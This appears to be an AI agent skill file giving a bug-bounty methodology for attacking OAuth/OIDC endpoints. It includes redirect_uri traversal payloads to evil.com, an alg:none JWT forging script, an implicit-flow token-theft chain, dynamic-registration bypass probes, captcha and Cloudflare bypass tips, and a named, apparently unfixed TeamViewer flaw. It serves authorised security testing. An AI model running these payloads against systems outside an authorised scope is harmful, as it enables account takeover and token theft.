---
name: oauth-oidc-audit
description: "Use when auditing OAuth/OIDC endpoints for bug bounty."
metadata:
  version: 1.0.0
tags: [oauth, oidc, jwt, cors, bug-bounty, fintech, token-theft]
---

# OAuth 2.0 / OpenID Connect Security Audit

Systematic methodology for finding critical vulnerabilities in OAuth/OIDC implementations.
High-value on fintech, banking, and wallet platforms where OAuth scopes control financial operations.

## Triggers
- OAuth / OIDC / OpenID Connect audit
- JWT security / algorithm confusion / alg none
- Token endpoint / authorize endpoint testing
- CORS on OAuth endpoints
- Implicit flow / response_type=token
- connect.* / auth.* / login.* subdomain testing
- `.well-known/openid-configuration` analysis
- Fintech / digital bank / wallet bug bounty
- "pelajari scope" / "study the scope" for any YesWeHack or HackerOne program link,
  even before any OAuth-specific detail is known — this skill's scope-study-workflow
  reference is the general entrypoint for that request on either platform

## Phase 1: OIDC Discovery Reconnaissance

Always start here — unauthenticated, reveals entire OAuth attack surface:

```bash
curl -s https://TARGET/.well-known/openid-configuration | python3 -m json.tool
```

### Critical fields to check:
| Field | What to look for |
|-------|-----------------|
| `id_token_signing_alg_values_supported` | **"none"** = unsigned JWT accepted |
| `token_endpoint_auth_methods_supported` | **"none"** = unauthenticated clients |
| `response_types_supported` | **"token"** = implicit flow (token in URL) |
| `grant_types_supported` | **"implicit"**, jwt-bearer, redelegate |
| `scopes_supported` | Financial/sensitive: transfer, balance, payment |
| `registration_endpoint` | Dynamic client registration = register attacker client |
| `request_uri_parameter_supported` | **true** = potential SSRF via request_uri |
| `jwks_uri` | Check for weak/default keys (kid: "rsa1" suspicious) |

### Red flags in OIDC config:
- `"none"` in signing algorithms → JWT algorithm confusion (Critical)
- `"none"` in token_endpoint_auth → clients without authentication
- Implicit flow + sensitive scopes → token theft chain
- `request_parameter_supported: true` → inline request object attacks
- `registration_endpoint` accessible → register malicious client

## Phase 2: CORS Analysis on OAuth Endpoints

```bash
# Check token endpoint
curl -sI -X OPTIONS https://TARGET/token \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Content-Type, Authorization"

# Check userinfo endpoint
curl -sI https://TARGET/userinfo \
  -H "Origin: https://evil.com" \
  -H "Authorization: Bearer test"
```

**Critical finding:** `Access-Control-Allow-Origin: *` on /token or /userinfo
- Enables cross-origin token exchange from attacker's website
- JavaScript on any domain can call these endpoints
- Combined with stolen auth codes → full token theft from browser

## Phase 3: Authorization Endpoint Testing

```bash
# Test client_id validation
for cid in "NONEXISTENT" "random_$(date +%s)" "null" "12345" "test'"; do
  curl -s -o /dev/null -w "client_id=$cid → HTTP %{http_code}\n" \
    "https://TARGET/authorize?client_id=$cid&redirect_uri=https://evil.com&response_type=token&scope=openid"
done

# Test empty client_id (error handling)
curl -s -o /dev/null -w "empty → HTTP %{http_code}\n" \
  "https://TARGET/authorize?client_id=&redirect_uri=https://evil.com&response_type=code"
```

**Findings to look for:**
- All random client_ids return 302 → no pre-auth client validation
- Empty client_id → 500 = unhandled exception
- Quotes accepted without WAF block → potential injection path

## Phase 3c: redirect_uri Path Traversal (domain-prefix bypass)

Some OAuth servers validate `redirect_uri` by checking that it starts with an allowed domain
but skip path normalization — `/../` sequences are accepted without canonicalizing.

```bash
ALLOWED="https://web.teamviewer.com"

# Baseline — direct evil.com: REJECTED
curl -so /dev/null -w "%{http_code}" "https://TARGET/authorize?redirect_uri=https://evil.com"

# Path traversal — ACCEPTED if server only checks domain prefix:
curl -so /dev/null -w "%{http_code}" "https://TARGET/authorize?redirect_uri=${ALLOWED}/../../evil.com"
curl -so /dev/null -w "%{http_code}" "https://TARGET/authorize?redirect_uri=${ALLOWED}%2F..%2F..%2Fevil.com"  # encoded

# Signs of vulnerability:
# - direct evil.com → 400/BadRequest
# - with /../ traversal → 200 (login page renders)
# - All auth flow links in page carry the malicious redirect_uri
```

**Detection via camofox (needed when CF blocks curl):**

```python
import urllib.parse, json, urllib.request

def test_redirect_uri_traversal(allowed_origin, target_login_url, evil_domain="evil.com"):
    payloads = [
        f"https://{evil_domain}",                             # baseline — should reject
        f"{allowed_origin}/../../{evil_domain}",               # path traversal
        f"{allowed_origin}%2F..%2F..%2F{evil_domain}",        # encoded
        f"{allowed_origin}/./{evil_domain}",                   # dot-slash
        f"{allowed_origin}/../{evil_domain}",                  # single level
    ]
    for payload in payloads:
        encoded = urllib.parse.quote(payload, safe='')
        tab_id, _ = camofox_open(f"{target_login_url}?redirect_uri={encoded}")
        _, snap = camofox_snap(tab_id, wait=3)
        status = "BadRequest" if "BadRequest" in snap else ("ACCEPTED" if "Sign in" in snap or "login" in snap.lower() else "unknown")
        print(f"[{status}] {payload[:70]}")
```

**Confirmed on TeamViewer (2026-08-01) — validated via Google OAuth `state` decode:**

Server accepts these traversal variants (HTTP 200, login page renders):
```bash
# REJECTED (400/BadRequest):
https://web.teamviewer.com/../../evil.com        # 2-level from root

# ACCEPTED (HTTP 200, login form renders normally):
https://web.teamviewer.com/../../../evil.com     # 3-level from root
https://web.teamviewer.com/authenticate/../../evil.com  # 2-level from /authenticate
```

**State parameter decode proof** — after entering email, browser redirects to Google OAuth with `state` containing:
```json
{"RedirectUri": "https://web.teamviewer.com/../../../evil.com", ...}
```
The malicious `redirect_uri` is embedded into the OAuth `state` sent to Google. After Google auth, TeamViewer's `/sociallogin/redirecturl` callback uses this `RedirectUri` value — confirmed still present in callback URL params.

**Detection script (camofox + state decode):**
```python
import re, json, urllib.parse as up

def check_state_traversal(target_login, allowed_origin, evil_domain="evil.com"):
    payloads = [
        f"{allowed_origin}/../../{evil_domain}",       # 2-level
        f"{allowed_origin}/../../../{evil_domain}",    # 3-level  
        f"{allowed_origin}/auth/../../{evil_domain}",  # via auth path
    ]
    for payload in payloads:
        tab, _ = camofox_open(f"{target_login}?redirect_uri={up.quote(payload, safe='')}")
        _, snap = camofox_snap(tab, wait=3)
        # Trigger OAuth by entering email + click Continue
        refs = re.findall(r'textbox[^[]*\[(\w+)\]', snap)
        camofox_type(tab, refs[0], "user@example.com")
        btn = re.findall(r'button "Continue"[^[]*\[(\w+)\]', snap)
        camofox_click(tab, btn[0])
        _, snap2 = camofox_snap(tab, wait=5)
        url2 = get_current_url(tab)  # final URL after redirect
        
        # If redirected to Google OAuth, decode state parameter
        state_match = re.search(r'[?&]state=([^&]+)', url2)
        if state_match:
            state = json.loads(up.unquote(state_match.group(1)))
            redirect_in_state = state.get("RedirectUri", "")
            if evil_domain in redirect_in_state or ".." in redirect_in_state:
                print(f"[VULN] {payload}")
                print(f"  RedirectUri in state: {redirect_in_state}")
```

**Severity:** Medium → High if login completes and callback redirects to evil domain. Submit at Medium with state parameter decode as evidence; mention High potential pending account test.

**Blocker — hCaptcha on post-OAuth password form:** TeamViewer's `/sociallogin/signin` page (shown after Google OAuth completes) has an hCaptcha checkbox that disables the "Sign in" button in headless browsers. Camofox bypasses Cloudflare Turnstile but NOT hCaptcha. To complete the PoC, either: (a) the user manually completes one login in a real browser, or (b) use captcha-rotator skill with 2captcha. The state-decode evidence alone is sufficient for Medium submission without completing the login flow.

**Broad applicability:** Try against any OAuth login page where you know one allowed `redirect_uri` from JS bundle or OIDC config. Server validates `startsWith(allowed)` without `normalize()`.

## Phase 4: JWT Algorithm Confusion

If OIDC config advertises `"none"` in id_token_signing_alg:

```python
import base64, json

header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "victim_id", "iss": "https://TARGET", "exp": 9999999999}

def b64url(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b'=').decode()

token = f"{b64url(header)}.{b64url(payload)}."
# Test against: /userinfo, downstream APIs, resource servers
```

Test the crafted token against every endpoint that accepts Bearer tokens.
Even if the primary OAuth server rejects it, downstream services may accept it.

## Phase 5: Implicit Flow Attack Chain

When `response_type=token` is supported with sensitive scopes:

```
https://TARGET/authorize
  ?client_id=ANY_VALUE           (if no validation)
  &redirect_uri=https://evil.com (if not strictly validated per-client)
  &response_type=token           (token in URL fragment)
  &scope=balance+transfer+payments
```

**Attack chain:**
1. Attacker crafts URL (legitimate OAuth domain = victim trusts it)
2. Victim authenticates on real login page
3. Post-auth redirect sends `#access_token=XXX` to attacker's domain
4. Attacker's JS captures token → calls API with financial scopes

**Note:** To fully confirm, you need to complete a login flow. Pre-auth findings
(no client_id validation, CORS *, alg none) are reportable even without a test account.

## Phase 6: Additional Checks

```bash
# Dynamic client registration
curl -s -X POST https://TARGET/register \
  -H "Content-Type: application/json" \
  -d '{"redirect_uris":["https://evil.com"],"token_endpoint_auth_method":"none"}'

# Token introspection (info leak)
curl -s -X POST https://TARGET/introspect -d "token=random_value"

# JWKS analysis
curl -s https://TARGET/jwk  # Check key size, kid naming, algorithm

# Environment leaks in headers
curl -sI https://TARGET/.well-known/openid-configuration | grep -i "x-application-context\|x-powered\|server"
```

## Severity Assessment

**RULE: Report the severity you can PROVE, not the severity you hypothesize.**

| Finding | Alone (proven) | With full PoC |
|---------|----------------|---------------|
| alg "none" in OIDC config (advertised) | Low/Medium (info) | Critical ONLY if unsigned token accepted |
| alg "none" proven (token works) | Critical | — |
| CORS * on /token (no Allow-Credentials) | Medium | High (amplifies token theft) |
| CORS * WITH Allow-Credentials: true | High | Critical (direct session theft) |
| /authorize accepts fake client_id | Low (if deferred validation exists) | Medium |
| Implicit flow + financial scopes | Medium (design flaw) | High (needs valid client_id + weak redirect_uri) |
| Hardcoded client credentials in APK | **Critical** (proven token grant) | — |
| Full chain end-to-end (token stolen) | — | Critical (CVSS 9.1-9.3) |

**CVSS for full chain:** AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N

### Validation checklist before reporting as Critical:
- [ ] Crafted alg:none token → did /userinfo or downstream API accept it?
- [ ] CORS * → tested with AND without `Access-Control-Allow-Credentials`?
- [ ] No client_id validation → tested the FULL flow (including /login step)?
- [ ] Implicit flow → completed login and observed redirect_uri behavior?
- [ ] APK credentials → actually obtained valid access_token?

If any checkbox is unchecked, downgrade to the "Alone" severity column.

## Report Strategy

Combine findings into ONE report showing the complete attack chain:
- Title: "OAuth/OIDC Critical Misconfiguration Chain Leading to Account Takeover"
- Show each finding as a link in the chain
- Include attack chain diagram
- Quantify impact: number of users, financial operations possible with scopes
- For hardcoded secrets: report ALONE (not chained) — standalone Critical

→ see `references/yeswehack-report-format.md` for exact field mapping and **correct Bug Type
  dropdown values** (CWE-based). The options differ from program policy wording.

## Pitfalls

### Severity discipline — VALIDATE before claiming Critical
- **OIDC config advertising "none" ≠ server actually accepting unsigned tokens.** Always craft
  an alg:none JWT and test against /userinfo + downstream APIs. Many OIDC libraries (MITREid
  Connect, Spring Auth Server) list all algorithms in discovery but reject "none" at runtime.
- **No client_id validation at /authorize ≠ no validation at all.** Some servers use DEFERRED
  validation — `/authorize` stores params in session then `/login` validates. Test the full flow:
  get SESSION cookie from /authorize → call /login with that cookie → check error message.
  If it says "Client with id X was not found" → the validation exists, just deferred. NOT exploitable.
- **CORS: * without `Access-Control-Allow-Credentials: true`** means browser won't send cookies
  cross-origin. Impact is limited: attacker JS can READ responses but only if it already has a
  Bearer token. Standalone = Medium. Only escalates to Critical when combined with token theft.
- **Programs WILL reject "theoretical" Critical reports.** Before claiming Critical, you need
  EITHER: (a) end-to-end exploit PoC, OR (b) confirmed token grant with stolen/leaked credentials.
  "The config says X is possible" without proof of exploitation = Medium at best.
- **DO NOT claim exploitation until you have real tool output proving it.** A 302 redirect from
  /authorize does NOT prove token theft. A CORS header does NOT prove data exfiltration. Test
  the FULL chain or downgrade honestly.

### Source-code scope entries — verdict fast, don't narrate file-by-file
When a scope entry is a GitHub repo, check the dependency manifest (package.json /
build.gradle / Podfile) before reading source files — a `cdn.*` script tag or Maven/
CocoaPods binary coordinate means the real logic is elsewhere and the repo is a thin
wrapper/demo. Give one short verdict, don't walk through each file with commentary.
→ see `references/scope-study-workflow.md` "Source code scope entries" pitfall for
the full Plaid example and the exact correction that prompted this.

### Deferred validation trap (Maya 2026 lesson)
- `/authorize` returned 302 for ANY client_id → initially reported as "no validation" (Critical)
- Reality: server stores params in SESSION cookie, validates at `/login` step → "Client not found"
- Test: `curl /authorize → get SESSION → curl /login -H "Cookie: SESSION=..."` → check error
- If /login rejects: it's deferred validation, NOT missing validation. Severity = Low.

### YesWeHack API — bounty amounts hidden without auth
YesWeHack API (`api.yeswehack.com/programs/<slug>`) hides bounty amounts and scope details
even with a valid auth token. The `reward_grid_*` fields return `null` or `0` for most programs.
To get real bounty amounts, authenticate AND check the `stats.average_reward` field — this leaks
even when individual grid values are hidden. Also: `eligible_for_bounty` in scope entries is often
`false` even when bounty IS available; the field is unreliable. Verify actual scope by reading the
program page in browser via camofox rather than trusting API data.

```python
# Reliable way to estimate bounty:
stats = d.get("stats") or {}
print(stats.get("average_reward"))   # leaks even when grid is hidden
print(stats.get("max_reward"))
# Check reward_grid_low.bounty_medium etc (different key than max_price)
g = d.get("reward_grid_low") or {}
print(g.get("bounty_medium"))  # actual payout, not max_price
```

### Technical pitfalls
- CORS * might only appear on error responses — verify on success responses too.
- WAF (AWS ELB, Cloudflare) may block SQL-like payloads but pass quotes to /authorize.
- Browser access to OIDC endpoints may get WAF-blocked; always test via curl first.
- Programs may classify OIDC misconfiguration as "informational" if no full exploit.
  Counter: chain the findings, show financial impact, calculate CVSS.
- YesWeHack: check if connect.*/auth.* subdomains are listed as separate scope entries.
- `x-application-context` header in Spring Boot apps leaks active profiles (stage/prod).
- Kong API Gateway version in `Server` header → check for known CVEs.
- AWS API Gateway responses differ: `MissingAuthenticationTokenException` (no auth) vs
  `IncompleteSignatureException` (HEAD method) vs app-level errors (with auth) — use these
  to fingerprint auth mechanism (IAM Sig-V4, custom authorizer, or passthrough).
- `x-oneagent-js-injection: true` + `dtCookie` headers = Dynatrace monitoring. Report as
  information disclosure (reveals APM stack, internal service topology).
- `set-cookie: JSESSIONID=...` confirms Java/Spring backend — check Spring Boot Actuator.
- Remote browsers (Browserbase, BrowserStack) are often fingerprinted/blocked by modern WAFs.
  Always validate with curl first; if curl works but browser doesn't, it's WAF vs bot detection,
  not a missing vulnerability. The vuln is real — just gather evidence via curl.
- **camofox-browser** (`github.com/jo-inc/camofox-browser`) is the preferred local browser
  for OAuth recon behind Cloudflare. Firefox-based, REST API on :9377, bypasses Turnstile.
  Install: `git clone && npm install && node server.js`. Pitfalls: screenshot endpoint returns
  raw PNG binary (not JSON/base64) — use `subprocess.run(capture_output=True)` bytes mode;
  hCaptcha (not Turnstile) still blocks headless form submit; element refs reset on navigation
  (re-snapshot before each click/type); `urllib.request.urlopen(req, context=ctx, timeout=N)`
  — context MUST be keyword arg, not positional (TypeError: message_body is SSLContext).

## Phase 3b: MCP Server OAuth Discovery (RFC 9728 / RFC 8414)

MCP (Model Context Protocol) servers are a growing bug bounty scope item —
programs increasingly ship an MCP server behind OAuth and call it out
explicitly in scope notes (often with a carve-out for Dynamic Client
Registration, see below). Discovery chain when you suspect or are told an
MCP server exists:

```bash
# 1. Find the MCP subdomain — try the obvious name first, it's usually literal
dig +short mcp.TARGET_DOMAIN A

# 2. Hit it unauthenticated — the 401 body itself hands you the discovery URL
curl -sD - -A "$UA" https://mcp.TARGET_DOMAIN/
# Look for: www-authenticate: Bearer error="invalid_token", ...,
#   resource_metadata="https://mcp.TARGET_DOMAIN/.well-known/oauth-protected-resource"

# 3. Fetch protected-resource metadata (RFC 9728) — public by design, no auth needed
curl -s -A "$UA" https://mcp.TARGET_DOMAIN/.well-known/oauth-protected-resource | python3 -m json.tool
# Gives: resource, authorization_servers[], scopes_supported

# 4. Fetch the authorization server metadata (RFC 8414) — reveals the FULL
#    OAuth surface: authorize/token/registration/revocation endpoints,
#    supported grant_types, response_types, token_endpoint_auth_methods
curl -s -A "$UA" https://mcp.TARGET_DOMAIN/.well-known/oauth-authorization-server | python3 -m json.tool
```

The authorization-server metadata is the highest-value single request in
this chain — it typically reveals the real auth provider (Auth0, Okta, etc.)
via distinct endpoint hostnames (e.g. `authorization_endpoint` on the app's
own domain, `token_endpoint` on a separate `login.*` subdomain), the full
`grant_types_supported` list (watch for `implicit`, `password`,
`client_credentials` sitting alongside safer flows), and the
`registration_endpoint` for Dynamic Client Registration — test that next.

## Testing Dynamic Client Registration (DCR) redirect_uri host allowlisting

Many MCP/OAuth programs explicitly note that their DCR endpoint (RFC 7591,
`POST /oauth/register` or similar) is intentionally public — anyone can
register an OAuth client. This is BY DESIGN for MCP client interoperability
and is listed non-qualifying on its own (see `smart-contract-audit`'s
`references/web-recon-pitfalls.md` for the scope-reading side of this). The
actual security control worth testing is whether the registration endpoint
validates `redirect_uris` against a host allowlist — a missing or bypassable
check there is what turns "anyone can register a client" into "attacker can
register a client that redirects auth codes/tokens to their own domain",
which IS a real finding.

Test with a battery of redirect_uri values in a single POST body each,
1 req/sec, and read the `error_description` carefully — a well-implemented
allowlist rejects with a specific "host is not allowed: X" message that
echoes back the exact host it parsed, which is itself useful for confirming
the parser isn't naively regexing the string:

```bash
test_redirect() {
  curl -s -A "$UA" -X POST "https://TARGET/oauth/register" \
    -H "Content-Type: application/json" \
    -d "{\"client_name\":\"probe\",\"redirect_uris\":[\"$1\"]}"
  sleep 1
}

# Known-public MCP client callbacks — expect these to be allowed (baseline)
test_redirect "http://localhost:8080/callback"
test_redirect "https://claude.ai/api/mcp/auth_callback"
test_redirect "https://chatgpt.com/connector_platform_oauth_redirect"

# Bypass attempts — expect all of these to be REJECTED on a correctly built allowlist
test_redirect "https://evil.com/callback"                        # baseline reject
test_redirect "https://allowed-host.com@evil.com/callback"        # userinfo confusion
test_redirect "https://allowed-host.com.evil.com/callback"        # subdomain-suffix trick
test_redirect "https://evil.com/allowed-host.com/callback"        # path smuggling
test_redirect "https://ALLOWED-HOST.COM/callback"                 # case (should be ALLOWED — case-insensitive host match is correct behavior, not a bug)
```

If every bypass variant comes back `invalid_redirect_uri` with the host it
actually parsed named in the error (not the string you sent), the allowlist
is doing real hostname parsing (not naive substring/regex matching) and this
avenue is closed — say so plainly and move to a different unauthenticated
surface rather than continuing to iterate bypass variants. This is what
"closed, confirmed" looks like for a DCR carve-out target: multiple distinct
bypass classes tried, all correctly rejected with host-specific errors, one
request at a time under the program's rate cap.

## Escalation: APK Decompile for OAuth Client Credentials

When client_id can't be found via web recon, decompile the mobile app.
Hardcoded OAuth secrets in client-side code is itself a **Critical** finding.

→ see `references/mobile-apk-secrets.md` for full workflow

## Pitfall: answer report-field questions from session artifacts, don't just explain the command

When the user asks "what do I put in field X" for a report already in progress (e.g.
"finger yang harus diisi apa?"), they want the actual value, not a tutorial. If the
target APK/binary is still on disk from earlier in the session (check `/tmp`, prior
`terminal` calls, or `session_search` for the download path), extract the value
yourself and hand back the literal string to paste. Only fall back to "here's the
command to run" if the artifact is genuinely gone and can't be re-derived. The user
finds "lo yang kasih, jangan nyuruh gue" a legitimate complaint, not impatience.

## Report Delivery to User

When preparing YesWeHack/Bugcrowd/HackerOne report text for the user to copy-paste:
1. **ONE code block per form field** when user asks section-by-section
2. If user says "rangkum dalam satu" / "one block" / wants everything at once → deliver the
   entire Description field (Description + Exploitation + PoC + Risk + Remediation) as a
   SINGLE markdown code block they can paste in one shot. Do NOT scatter it across prose.
3. For dropdown fields (Bug type, Scope, Vulnerable part, Impact), list exact values in a
   concise reference above the description block — not mixed into the narrative.

→ see `references/yeswehack-report-format.md` for exact field mapping

## Visual Evidence Generation

**NEVER generate fake/fabricated "screenshots"** (PIL terminal art, HTML mockups pretending
to be browser captures) — user considers these worthless and will reject immediately.
Evidence must come from REAL tool output: actual curl responses or real browser-rendered pages.

**User explicitly rejects fabricated evidence.** Even if a PIL-rendered image contains real data,
if it LOOKS like a fake screenshot the user will say "Itu screenshot buatan lo" and demand
real browser screenshots. The presentation format matters as much as the data accuracy.

If WAF blocks the remote browser but curl works, use a **local proxy server** approach:
write a Python HTTP server that fetches from the target via urllib, then navigate the browser
to `http://127.0.0.1:PORT/endpoint` to display REAL live data in a real browser window.
Screenshot THAT — it shows actual server responses rendered in a browser.

Acceptable evidence formats for YesWeHack/HackerOne/Bugcrowd:
1. **curl -sv output** with full request/response headers (the standard)
2. **Burp Suite request/response** export (or equivalent formatted curl output)
3. **Browser DevTools Network tab** screenshot (if endpoint accessible from browser)
4. **HTML terminal render** of REAL tool output displayed in browser then screenshotted —
   shows actual data from `strings`/`curl` in a polished terminal-style layout. User accepts
   this when it clearly shows the APK file, the extraction command, and the leaked string.
   Key: include `file` command output (ELF 64-bit ARM), `ls -la` with real size, and the
   actual `strings | grep` output with the credentials highlighted.

When remote browser (Browserbase) is WAF-blocked but curl works:
- Do NOT waste time trying to get browser screenshots from blocked endpoints
- curl with `-sv` flag showing real HTTP exchange IS the proof
- Render ACTUAL curl output into formatted PNG if visual needed
- State clearly: "WAF blocks browser access from datacenter IPs; endpoint confirmed
  accessible with standard browser UA via curl"

PIL terminal renderer (use hermes venv: `/usr/local/lib/hermes-agent/venv/bin/python3`):
→ see `references/evidence-generation.md`

**Playwright banner injection for annotated screenshots** — inject a visible URL/finding overlay
into any live page before screenshotting, without touching the server:

```python
async def inject_banner(page, url_text, finding_text="", color="#00ff88"):
    await page.evaluate(f"""() => {{
        ['__b1__','__b2__'].forEach(id=>{{let e=document.getElementById(id);if(e)e.remove()}});
        let d = document.createElement('div');
        d.id = '__b1__';
        d.style.cssText = 'position:fixed;top:0;left:0;right:0;z-index:9999999;background:#0d0d1a;'
            + 'color:{color};font-family:monospace;font-size:11px;padding:5px 8px;'
            + 'border-bottom:2px solid {color};word-break:break-all;line-height:1.6';
        d.innerHTML = '<b>[PoC URL]</b> {url_text}'
            + ('{finding_text}' ? '<br><b>[Finding]</b> {finding_text}' : '');
        document.body.prepend(d);
    }}""")
    await asyncio.sleep(0.3)
    await page.screenshot(path=output_path, full_page=False)
```

Use `color="#ff4444"` for findings, `color="#00ff88"` for baseline/normal state. Two banners
stack by using IDs `__b1__` and `__b2__`. This approach avoids `page.set_content()` which
times out when a live page is loaded (Playwright waits for `load` event that may never fire
on top of an existing page). The `evaluate()` + direct `screenshot()` combo always works.

## Reference Files
- `references/oauth-attack-patterns.md` — detailed payloads, edge cases, provider-specific quirks
- `references/evidence-generation.md` — PIL-based terminal screenshot generator for reports
- `references/mobile-apk-secrets.md` — APK decompile workflow for extracting hardcoded OAuth credentials
- `references/yeswehack-report-format.md` — exact YesWeHack submission form fields and template
- `references/scope-study-workflow.md` — how to read and summarize a bug bounty program's
  scope/policy page before touching the target (YesWeHack + HackerOne platform mechanics,
  what to extract, recon pitfalls: WAF-block vs finding, out-of-scope domain drift, S3/CSP
  mining, service-mesh 404s, **YesWeHack API shortcut bypass Cloudflare**, gov geo-block)
- `references/keycloak-recon.md` — Keycloak stack detection, realm discovery, CVE checklist,
  custom SPI attack surface; includes DMP/ansforge case study
- `references/goto-financial-recon.md` — GoTo Financial/Midtrans (YesWeHack) scope map, Midtrans API auth/IDOR vectors, mokapos.com MFE architecture, accessibility notes from VPS
- `references/infomaniak-recon.md` — Infomaniak (YesWeHack) scope map, API endpoints from MCP
  source, SwissTransfer API schema, CORS findings, priority IDOR vectors, authenticated test setup
